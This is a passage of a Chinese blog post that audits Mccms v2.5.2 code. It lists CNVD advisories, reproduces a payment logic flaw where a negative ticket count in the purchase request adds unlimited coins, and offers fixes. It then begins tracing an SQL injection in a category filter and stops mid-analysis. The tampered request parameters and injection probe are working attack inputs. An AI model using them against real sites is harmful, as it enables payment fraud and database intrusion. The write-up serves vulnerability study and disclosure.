+</blockquote>
+<h2 id="CMS已被找到的公开漏洞信息"><a href="#CMS已被找到的公开漏洞信息" class="headerlink" title="CMS已被找到的公开漏洞信息"></a><code>CMS</code>已被找到的公开漏洞信息</h2><p><code>CNVD-2021-51411</code>【危害低】</p>
+<table>
+<thead>
+<tr>
+<th>公开时间2021-08-18</th>
+<th>报送时间2021-07-06</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>收录时间2021-07-16</td>
+<td>更新时间2021-07-16</td>
+</tr>
+<tr>
+<td><code>CVSS 2.0--</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>CVSS 3.X--</code></td>
+<td></td>
+</tr>
+<tr>
+<td>影响产品桂林崇胜网络科技有限公司 漫城<code>CMS v2.5.2</code></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><code>CNVD-2021-48907</code>【危害高】</p>
+<table>
+<thead>
+<tr>
+<th>公开时间2021-08-12</th>
+<th>报送时间2021-06-28</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>收录时间2021-07-09</td>
+<td>更新时间2021-07-09</td>
+</tr>
+<tr>
+<td><code>CVSS 2.0--</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>CVSS 3.X--</code></td>
+<td></td>
+</tr>
+<tr>
+<td>影响产品桂林崇胜网络科技有限公司 漫城<code>CMS v2.5.2</code></td>
+<td></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>CNVD-2021-51867</p>
+<p>中危 Mccms存在任意文件下载漏洞</p>
+<p>桂林崇胜网络科技有限公司 Mccms v2.5.2</p>
+<p>2021-08-18</p>
+</blockquote>
+<blockquote>
+<p>CNVD-2021-51492</p>
+<p>中危 Mccms存在文件上传漏洞</p>
+<p>桂林崇胜网络科技有限公司 Mccms v2.5.2</p>
+<p>2021-08-18</p>
+</blockquote>
+<blockquote>
+<p>CNVD-2021-51860</p>
+<p>中危 Mccms存在逻辑缺陷漏洞</p>
+<p>桂林崇胜网络科技有限公司 Mccms v2.5.2</p>
+<p>2021-08-18</p>
+</blockquote>
+<h2 id="批量代码审计"><a href="#批量代码审计" class="headerlink" title="批量代码审计"></a>批量代码审计</h2><p><code>Seay</code>代码审计</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122165423902.png"><img src="/CMS-Test/image-20221122165423902.png" alt="image-20221122165423902"></a></p>
+<p>由我们对更新文档中的信息以及目录结构猜测这些漏洞大概出现在哪些代码处</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1-充值月票逻辑缺陷"><a href="#1-充值月票逻辑缺陷" class="headerlink" title="1.充值月票逻辑缺陷"></a>1.充值月票逻辑缺陷</h3><blockquote>
+<p>充值月票逻辑缺陷<br>猜测为支付漏洞<br>常见大致有4种，修改单价，修改总价，修改购买数量，以及重复发包导致以少量的钱实现多次购买</p>
+</blockquote>
+<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>查看支付代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#sys/apps/controllers/api/Pay.php </span></span><br><span class="line">  <span class="comment">//金币</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;cion&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">10</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">20</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">20</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">30</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">30</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">50</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">50</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//VIP</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;vip&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">30</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb1,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;月度VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期30天&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">90</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb2,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;季度VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期90天&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">180</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb3,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;半年VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期180天&#x27;</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;day&#x27;</span>=&gt;<span class="number">365</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;Pay_Vip_Rmb4,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;年度VIP&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="string">&#x27;有效期365天&#x27;</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//月票</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;ticket&#x27;</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">1</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">5</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">5</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">5</span>),</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;rmb&#x27;</span>=&gt;<span class="number">10</span>,<span class="string">&#x27;cion&#x27;</span>=&gt;Pay_Rmb_Cion*<span class="number">10</span>),</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"><span class="comment">/*上面三个数组实现了rmb，金币，月票，vip之间的兑换率*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//支付方式</span></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_wxpay&#x27;</span>] = Pay_Wx_Mode;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_alipay&#x27;</span>] = Pay_Ali_Mode;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;pay&#x27;</span>][<span class="string">&#x27;is_qqpay&#x27;</span>] = Pay_QQ_Mode;</span><br></pre></td></tr></table></figure>
+
+<p>上面主要是对数据之间关系的定义，关键在下方代码中，如何让我们的恶意订单成功并入库</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#sys/apps/controllers/api/Pay.php</span></span><br><span class="line"> <span class="comment">//充值订单入库</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$type</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;type&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$pay</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;pay&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$rmb</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;rmb&#x27;</span>);</span><br><span class="line">    <span class="variable">$num</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;num&#x27;</span>);</span><br><span class="line">    <span class="variable">$day</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;day&#x27;</span>);</span><br><span class="line">	<span class="variable">$card</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;card&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$dayarr</span> = <span class="keyword">array</span>(<span class="number">30</span>,<span class="number">90</span>,<span class="number">180</span>,<span class="number">365</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$day</span> == <span class="number">0</span>) <span class="variable">$day</span> = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;cion&#x27;</span> &amp;&amp; (<span class="variable">$rmb</span> == <span class="number">0</span> || <span class="variable">$rmb</span> &gt;<span class="number">9999</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;金额错误!!!&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;cion&#x27;</span> &amp;&amp; <span class="variable">$rmb</span> &lt; Pay_Rmb_Min) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;最低充值金额&#x27;</span>.Pay_Rmb_Min.<span class="string">&#x27;元&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;ticket&#x27;</span> &amp;&amp; <span class="variable">$num</span> == <span class="number">0</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;月票数量错误!!!&#x27;</span>);</span><br><span class="line">    <span class="comment">/*这里有个很明显的漏洞就是，对月票数的限制只有不为0，而对于&lt;0的值，很明显可以绕过*/</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;card&#x27;</span> &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$card</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;卡密不能为空!!!&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;vip&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$day</span>, <span class="variable">$dayarr</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;Vip时间错误!!!&#x27;</span>);</span><br><span class="line">    <span class="variable">$parr</span> = <span class="keyword">array</span>(<span class="string">&#x27;cion&#x27;</span>,<span class="string">&#x27;wxpay&#x27;</span>,<span class="string">&#x27;alipay&#x27;</span>,<span class="string">&#x27;qqpay&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$pay</span>, <span class="variable">$parr</span>)) <span class="variable">$pay</span> = <span class="string">&#x27;cion&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>金币支付代码流程分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/api/Pay.php</span></span><br><span class="line">        <span class="comment">//金币支付</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pay</span> == <span class="string">&#x27;cion&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//判断金币是否不足</span></span><br><span class="line">            <span class="variable">$cion</span> = <span class="variable">$rmb</span> * Pay_Rmb_Cion;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$cion</span> &gt; <span class="variable">$user</span>[<span class="string">&#x27;cion&#x27;</span>]) <span class="title function_ invoke__">get_json</span>(Pay_Cion_Name.<span class="string">&#x27;不足，请先充值!!!&#x27;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//购买月票</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$type</span> == <span class="string">&#x27;ticket&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$edit</span>[<span class="string">&#x27;ticket&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;ticket&#x27;</span>]+<span class="variable">$num</span>;</span><br><span class="line">                <span class="variable">$name</span> = <span class="string">&#x27;购买月票成功&#x27;</span>;</span><br><span class="line">                <span class="variable">$text</span> = <span class="string">&#x27;您花费&#x27;</span>.<span class="variable">$cion</span>.Pay_Cion_Name.<span class="string">&#x27;，成功购买了&#x27;</span>.<span class="variable">$num</span>.<span class="string">&#x27;张月票&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$name</span> = <span class="string">&#x27;购买VIP会员成功&#x27;</span>;</span><br><span class="line">                <span class="variable">$text</span> = <span class="string">&#x27;您花费&#x27;</span>.<span class="variable">$cion</span>.Pay_Cion_Name.<span class="string">&#x27;，成功购买了&#x27;</span>.<span class="variable">$day</span>.<span class="string">&#x27;天Vip会员&#x27;</span>;</span><br><span class="line">                <span class="variable">$edit</span>[<span class="string">&#x27;vip&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$user</span>[<span class="string">&#x27;viptime&#x27;</span>] &gt; <span class="title function_ invoke__">time</span>())&#123;</span><br><span class="line">                    <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;viptime&#x27;</span>]+<span class="number">86400</span>*<span class="variable">$day</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="title function_ invoke__">time</span>()+<span class="number">86400</span>*<span class="variable">$day</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//判断赠送天数</span></span><br><span class="line">                <span class="keyword">if</span>((<span class="variable">$day</span>/<span class="number">30</span>) &gt; Pay_Vip_Month)&#123;</span><br><span class="line">                	<span class="variable">$sday</span> = (<span class="keyword">int</span>)((<span class="variable">$day</span>/<span class="number">30</span>) - Pay_Vip_Month);</span><br><span class="line">                	<span class="keyword">if</span>(<span class="variable">$sday</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                		<span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>] = <span class="variable">$edit</span>[<span class="string">&#x27;viptime&#x27;</span>]+<span class="number">86400</span>*<span class="variable">$sday</span>;</span><br><span class="line">                		<span class="variable">$text</span> .= <span class="string">&#x27;，系统赠送您&#x27;</span>.<span class="variable">$sday</span>.<span class="string">&#x27;天&#x27;</span>;</span><br><span class="line">                	&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;    </span><br></pre></td></tr></table></figure>
+
+<p>我们实现月票反向充值金币的前提绕过就算这个对金币数量是否充足的绕过，<code>$cion</code>中<code>rmb</code>是默认大于<code>Pay_Rmb_Min</code>这个全局变量值为<code>1</code>，而<code>Pay_Rmb_Cion</code>也是默认为<code>10</code><br>而<code>$user[&#39;cion&#39;]</code>是我们自带的开始金币数，其中我们能控制得参数就只有<code>rmb</code>，但其实还有<code>num</code>。</p>
+<p>当我们购买1张月票数时，<code>rmb</code>为<code>￥1</code>，但当我们购买<code>-1</code>张月票时呢，因为<code>rmb</code>为真，已经通过了其判断，但是当<code>num</code>计算总金额时，并没有对<code>num值</code>的逻辑性进行判断，<br>因此<br>&#x3D;&#x3D;&gt;<br>当<code>type=ticket&amp;rmb=1&amp;day=30&amp;num=10&amp;pay=cion</code><br>【花费<code>rmb=1*10</code>等价金币买月票，也就是花费100金币买10张月票】<br>改成<br><code>type=ticket&amp;rmb=1&amp;day=30&amp;num=-10&amp;pay=cion</code><br>【花费<code>rmb=1*(-10)</code>等价月票，也就是花费10月票买100金币，相当于花-100金币，买-10张的月票</p>
+<blockquote>
+<p><strong>金币&#x3D;金币-(-10)</strong></p>
+<p>  <strong>月票&#x3D;月票+(-10)</strong></p>
+</blockquote>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>先给我的账户修改一下金币数</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124135152005.png"><img src="/CMS-Test/image-20221124135152005.png" alt="image-20221124135152005"></a></p>
+<p>然后购买月票抓包看看数据</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124135229059.png"><img src="/CMS-Test/image-20221124135229059.png" alt="image-20221124135229059"></a></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124135257569.png"><img src="/CMS-Test/image-20221124135257569.png" alt="image-20221124135257569"></a></p>
+<blockquote>
+<p><code>type=ticket&amp;rmb=1&amp;day=30&amp;num=1&amp;pay=cion</code><br>#可以看到我们的购买数据完全显示出来<br>type:购买的商品类型<br>rmb:花费金额<br>day:购买物品时限<br>num:购买数量<br>pay:支付方式</p>
+</blockquote>
+<p>先试试修改一下购买数量</p>
+<p>【金币<code>10000</code>，购买<code>1</code>张月票花<code>10</code>金币，应该还剩<code>9990</code>】</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141049742.png"><img src="/CMS-Test/image-20221124141049742.png" alt="image-20221124141049742"></a></p>
+<p>【金币<code>10000</code>，购买<code>10</code>张月票花<code>100</code>金币，应该还剩<code>9900</code>】</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141119999.png"><img src="/CMS-Test/image-20221124141119999.png" alt="image-20221124141119999"></a></p>
+<p>然后我们再看看我们的剩余金额</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141240128.png"><img src="/CMS-Test/image-20221124141240128.png" alt="image-20221124141240128"></a></p>
+<p>发现扣了<code>200</code>金币（应该是不小心发了两次包）</p>
+<p>【还剩<code>9800</code>】</p>
+<p>虽然没有实现我们的目的，既然在我们金额能承受范围内可以，那么试试超过我们金额以外的呢</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141731975.png"><img src="/CMS-Test/image-20221124141731975.png" alt="image-20221124141731975"></a></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141845487.png"><img src="/CMS-Test/image-20221124141845487.png" alt="image-20221124141845487"></a></p>
+<p>发现显示金币不够，既然正常的数据不行，那么我们把数量改成负数呢</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141931064.png"><img src="/CMS-Test/image-20221124141931064.png" alt="image-20221124141931064"></a></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124141937935.png"><img src="/CMS-Test/image-20221124141937935.png" alt="image-20221124141937935"></a></p>
+<p>居然购买成功？</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142002433.png"><img src="/CMS-Test/image-20221124142002433.png" alt="image-20221124142002433"></a></p>
+<p>我们发现我们的月票数减少了，但是金币数增加了，而且月票数为负数，明显是有问题的</p>
+<p>在购买记录中，我们发下确实也有记录</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142151770.png"><img src="/CMS-Test/image-20221124142151770.png" alt="image-20221124142151770"></a></p>
+<p>而获取金币的方式本来应该是通过<code>rmb</code>支付</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142246178.png"><img src="/CMS-Test/image-20221124142246178.png" alt="image-20221124142246178"></a></p>
+<p>但是这里通过简单的修改月票数为负数，即可反向增加金币数量，且没有上限制</p>
+<p>这里我又把<code>type</code>和<code>pay</code>两者交换</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142618960.png"><img src="/CMS-Test/image-20221124142618960.png" alt="image-20221124142618960"></a></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142629873.png"><img src="/CMS-Test/image-20221124142629873.png" alt="image-20221124142629873"></a></p>
+<p>发现依旧购买成功，还显示购买<code>10</code>金币，但是月票数并没有变化，而金币却减少了，应该是月票转金币不符合逻辑，但是发的请求包中的语句符合充值语句，于是按照语法，扣除了<code>num</code>数量的金币</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124142651295.png"><img src="/CMS-Test/image-20221124142651295.png" alt="image-20221124142651295"></a></p>
+<p>当我又改成且修改<code>rmb</code>改成<code>1000</code></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124150939398.png"><img src="/CMS-Test/image-20221124150939398.png" alt="image-20221124150939398"></a></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124151113186.png"><img src="/CMS-Test/image-20221124151113186.png" alt="image-20221124151113186"></a></p>
+<p>在交易记录中显示增加了<code>10000</code>金币，但是实际金币是在减少</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221124151205737.png"><img src="/CMS-Test/image-20221124151205737.png" alt="image-20221124151205737"></a></p>
+<p>这是因为不符合充值逻辑</p>
+<blockquote>
+<p>危害<br>通过该漏洞，即可导致金币、月票、vip三者可以无限制</p>
+</blockquote>
+<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><blockquote>
+<p>该漏洞的形成的根本原因在于<br>在sys&#x2F;apps&#x2F;controllers&#x2F;api&#x2F;Pay.php中<br>1.对客户端用户可控参数的限制不牢，考虑不全，<br>2.对于负数的清况，<br>3.以及对不合逻辑的支付方式的判断不够</p>
+<p>建议<br>1.对客户端可控参数进行加密，让用户无法修改其值<br>2.并且对参数的合理性以及逻辑性加强判断，完善整体代码逻辑，加强不同参数之间的联系，以及参数变化前后的逻辑性<br>3.最好不要让用户能对发送到服务器的数据进行修改或控制</p>
+</blockquote>
+<h3 id="2-SQL注入漏洞"><a href="#2-SQL注入漏洞" class="headerlink" title="2.SQL注入漏洞"></a>2.SQL注入漏洞</h3><h4 id="代码分析-漏洞利用"><a href="#代码分析-漏洞利用" class="headerlink" title="代码分析+漏洞利用"></a>代码分析+漏洞利用</h4><p>这里利用了<code>Acunetix</code>对站点扫描，发现了在主页存在高危的<code>SQL</code>漏洞</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126214707108.png"><img src="/CMS-Test/image-20221126214707108.png" alt="image-20221126214707108"></a></p>
+<p>发请求包，后发现其响应包的结果为数据库报错</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126214959756.png"><img src="/CMS-Test/image-20221126214959756.png" alt="image-20221126214959756"></a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>A Database Error Occurred<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              Error Number: 1064</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">     You have an error in your SQL syntax; check the manual that corresponds to     your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              select  count(*) as counta from mc_book where yid=0 and pay=0 and serialize=&#x27;连载&#x27; and cid in(1&amp;#039) order by addtime desc</span><br><span class="line">              #发现1&#x27;被插入in()中</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              Filename: D:/phpstudy_pro/WWW/127.0.0.3/sys/apps/models/Mcdb.php</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">          Line Number: 38</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>于是尝试再<code>in()</code>中能否实现闭合并执行恶意<code>sql</code>语句</p>
+<p>但是在源码中对sql语句有一定过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/user/Category.php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;BASEPATH&#x27;</span>) OR <span class="keyword">exit</span>(<span class="string">&#x27;No direct script access allowed&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Category</span> <span class="keyword">extends</span> <span class="title">Mccms_Controller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//智能检索</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$uri</span> = <span class="variable language_">$this</span>-&gt;uri-&gt;<span class="title function_ invoke__">uri_string</span>();</span><br><span class="line">        <span class="variable">$n</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$uri</span>,<span class="string">&#x27;/index&#x27;</span>) !== <span class="literal">false</span> ? <span class="number">3</span> : <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$this</span>-&gt;uri-&gt;<span class="title function_ invoke__">uri_to_assoc</span>(<span class="variable">$n</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">category</span>(<span class="variable">$arr</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>safe_replace</code></p>
